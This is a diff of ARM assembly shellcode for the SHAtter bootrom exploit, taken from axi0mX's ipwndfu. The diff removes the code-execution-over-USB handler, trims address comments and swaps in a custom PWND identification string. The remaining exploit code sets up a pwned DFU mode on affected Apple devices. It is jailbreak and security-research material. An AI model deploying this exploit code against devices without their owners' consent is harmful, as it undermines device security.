@@ -1,10 +1,7 @@
 @ SHAtter-shellcode.S
 @ Author: axi0mX
-@ Shellcode for SHAtter exploit with minor improvements:
-@ * supports 'exec' magic for code execution over USB
-@ * reports PWND:[SHAtter] in USB serial number string
 @ THIS FILE WAS TAKEN FROM axi0mx's ipwndfu (under GNU General Public License v3.0) UTILITY ON HIS GITHUB, I DO NOT TAKE OWNERSHIP FOR THE CODE IN THIS FILE
-@ ONLY MODIFIED WITH CUSTOM STRING
+@ ONLY MODIFIED WITH CUSTOM STRING AND REMOVED CODE EXEC OVER USB
 
 .text
 
@@ -42,8 +39,6 @@
 
 _start: .global _start
 
-@ Located at 0x8402F198 + 1
-
 .code 16
     MOV R0, #0
     LDR R1, =SECUREROM_ADDRESS
@@ -63,8 +58,6 @@ _start: .global _start
     LDR R3, =invalidate_instruction_cache
     BLX R3                                      @ invalidate_instruction_cache()
 
-@ Located at 0x8402F199 + 0x28
-
 relocate_shellcode:
     MOV R1, PC
     SUB R1, R1, #4                              @ R1 = PC - 4
@@ -80,8 +73,6 @@ relocate_shellcode:
     LDR R3, =RELOCATE_SHELLCODE_ADDRESS
     ADD R3, R3, #1
     BX R3                                       @ goto (RELOCATE_SHELLCODE_ADDRESS + 1)
-
-@ Located at 0x8402F199 + 0x42
 
 pwned_dfu_start:
     LDR R0, =MAIN_STACK_ADDRESS
@@ -103,8 +94,6 @@ pwned_dfu_start:
     MOV R2, #120
     LDR R3, =strlcat
     BLX R3                                      @ strlcat(gUSBSerialNumber, PWND_STRING, 120)
-
-@ Located at 0x8402F199 + 0x68
 
 pwned_dfu_loop:
     LDR R3, =usb_wait_for_image
@@ -132,34 +121,7 @@ pwned_dfu_loop:
     LDR R1, =EXEC_MAGIC
     CMP R0, R1
     BNE pwned_dfu_not_exec_magic                @ if (R0 != EXEC_MAGIC) goto pwned_dfu_not_exec_magic
-
-    LDR R0, [R5, #0x8]                          @ R0 = LOAD_ADDRESS[2]      /* arg1 */
-
-    LDR R1, [R5, #0xC]                          @ R1 = LOAD_ADDRESS[3]      /* arg2 */
-
-    LDR R2, [R5, #0x10]                         @ R2 = LOAD_ADDRESS[4]      /* arg3 */
-
-    LDR R3, [R5, #0x14]                         @ R3 = LOAD_ADDRESS[5]      /* arg4 */
-
-    LDR R4, [R5, #0x18]
-    STR R4, [SP]                                @ SP[0] = LOAD_ADDRESS[6]   /* arg5 */
-
-    LDR R4, [R5, #0x1C]
-    STR R4, [SP, #0x4]                          @ SP[1] = LOAD_ADDRESS[7]   /* arg6 */
-
-    LDR R4, [R5, #0x20]
-    STR R4, [SP, #0x8]                          @ SP[2] = LOAD_ADDRESS[8]   /* arg7 */
-
-    LDR R4, [R5, #0x4]
-    BLX R4                                      @ R0 = LOAD_ADDRESS[1](R0, R1, R2, R3, SP[0], SP[1], SP[2])
-
-    STR R0, [R5, #4]                            @ LOAD_ADDRESS[1] = R0
-
-    MOV R1, #0
-    STR R1, [R5]                                @ LOAD_ADDRESS[0] = 0
-
-    B pwned_dfu_loop                            @ goto pwned_dfu_loop
-
+    
 pwned_dfu_not_exec_magic:
     LDR R0, =LOAD_ADDRESS
     MOV R1, R4
@@ -259,4 +221,4 @@ img3_branch_R3:
 .align 2
 
 PWND_STRING:
-.ascii " SHAdow\x00"
+.ascii " KASSAR:[SHAdow]\x00"
